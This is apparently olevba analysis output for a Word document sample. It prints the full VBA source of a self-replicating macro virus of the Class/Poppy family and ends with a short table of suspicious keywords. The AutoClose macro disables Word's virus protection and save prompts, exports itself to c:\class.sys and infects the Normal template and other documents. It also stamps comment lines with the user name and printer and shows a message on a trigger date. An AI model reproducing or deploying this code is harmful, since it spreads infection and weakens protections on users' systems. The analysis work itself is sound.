olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Class.ct
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Class.ct - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
On Error GoTo out
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
Options.VirusProtection = False
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
Options.SaveNormalPrompt = False
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
Options.ConfirmConversions = False
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If nt > 70 And ad > 0 Then GoTo out
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If nt < 70 Then
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "Hey there, Carol! ", 0, "Class.Poppy"
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
With host.codemodule
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    For x = 1 To 4
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    .deletelines 1
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    Next x
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
End With
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
If nt < 70 Then
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    With host.codemodule
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline 1, "Sub AutoClose()"
'Ditry PC5/12/99 4:36:27 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline 91, "Sub ToolsMacro()"
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    For x = 70 To 81
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
        .deletelines 62
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    Next x
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline 35, "    For x = 1 To 4"
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    End With
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End If
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
With host.codemodule
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    For x = 2 To 104 Step 2
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
    Next x
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End With
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
out:
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End Sub
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
Sub ToolsMacro()
'Ditry PC5/12/99 4:36:28 PMHP LaserJet 4 on LPT1:sample1.doc
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

